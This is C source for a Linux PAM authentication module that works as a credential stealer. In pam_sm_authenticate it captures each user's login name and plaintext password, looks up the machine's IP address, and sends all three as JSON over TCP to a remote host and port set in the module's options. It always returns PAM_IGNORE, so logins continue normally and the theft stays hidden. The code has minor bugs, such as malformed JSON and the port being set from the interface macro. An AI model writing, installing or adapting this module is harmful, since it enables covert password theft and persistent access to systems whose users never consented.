// #define HOST "localhost"
// #define PORT "3000"
// #define IF "ens33"
#define PAM_SM_AUTH
#define BUFSZ 1024

#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

struct sockaddr_in *get_net_addr(struct ifreq *ifr, const char *iface) {
	if (!iface) {
		return NULL;
	}

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		return NULL;
	}

	int ifsz = strlen(iface);
	if (ifsz > IF_NAMESIZE) {
		return NULL;
	}
	strncpy(ifr->ifr_name, iface, ifsz);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl err failed to get box addr");
		close(fd);
		return NULL;
	}

	struct sockaddr_in *addr = (struct sockaddr_in *)&ifr->ifr_addr;

	close(fd);
	return addr;
}

typedef struct {
	const char *host;
	const char *iface;
	const char *port;
} module_options_t;

void module_options_initialize(module_options_t *options) {
	options->host = NULL;
	options->iface = NULL;
	options->port = NULL;
}

void module_options_parse(module_options_t *options, int argc, const char **argv) {
	char *host_needle = "host=";
	char *iface_needle = "iface=";
	char *port_needle = "port=";

	for (int i = 0; i < argc; i++) {
		const char *arg = argv[i];
		if (strstr(arg, host_needle) == arg) {
			options->host = arg + strlen(host_needle);
		}
		if (strstr(arg, iface_needle) == arg) {
			options->iface = arg + strlen(iface_needle);
		}
		if (strstr(arg, port_needle) == arg) {
			options->port = arg + strlen(port_needle);
		}
	}

#ifdef HOST
	options->host = HOST;
#endif
#ifdef IF
	options->iface = IF;
#endif
#ifdef PORT
	options->port = IF;
#endif
}

int send_credentials(const char *user,
					 const char *authtok,
					 const char *box_ip,
					 const char *remote,
					 const char *port) {
	const char *req_fmt =
		"{"
		"   \"user\": {"
		"       \"username\": \"%s\""
		"       \"password\": \"%s\""
		"   },"
		"   \"ip\": \"%s\""
		"}";

	if (!remote || !port) {
		return 1;
	}

	struct hostent *host = gethostbyname(remote);
	if (!host) {
		perror("gethostbyname err");
		return 1;
	}

	struct sockaddr_in servaddr;
	int p = atoi(port);

	memset(&servaddr, 0, sizeof(struct sockaddr_in));
	memcpy(&servaddr.sin_addr.s_addr, host->h_addr_list[0], host->h_length);
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(p);

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror("sock to remote open err");
		return 1;
	}

	if (connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
		perror("sock to remote connect err");
		close(sock);
		return 1;
	}

	char req[BUFSZ];
	sprintf(req, req_fmt, user, authtok, box_ip);
	if (write(sock, req, strlen(req)) < 0) {
		perror("sock to remote write err");
		close(sock);
		return 1;
	};

	char res[1];
	if (read(sock, res, 1) < 0) {
		perror("sock to remote read err");
		close(sock);
		return 1;
	}

	close(sock);
	if (*res == '0') {
		return 0;
	}
	return 1;
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	const char *user = NULL;
	const char *authtok = NULL;

	int pgu = pam_get_user(pamh, &user, NULL);
	if (pgu != PAM_SUCCESS) {
		return PAM_IGNORE;
	}
	int pga = pam_get_authtok(pamh, PAM_AUTHTOK, &authtok, NULL);
	if (pga != PAM_SUCCESS) {
		return PAM_IGNORE;
	}

	module_options_t opts;
	module_options_initialize(&opts);
	module_options_parse(&opts, argc, argv);

	struct ifreq ifr;
	struct sockaddr_in *net_addr = get_net_addr(&ifr, opts.iface);
	if (!net_addr) {
		return PAM_IGNORE;
	}

	int sent = send_credentials(user, authtok, inet_ntoa(net_addr->sin_addr), opts.host, opts.port);
	if (sent) {
		return PAM_IGNORE;
	}

	return PAM_IGNORE;
}
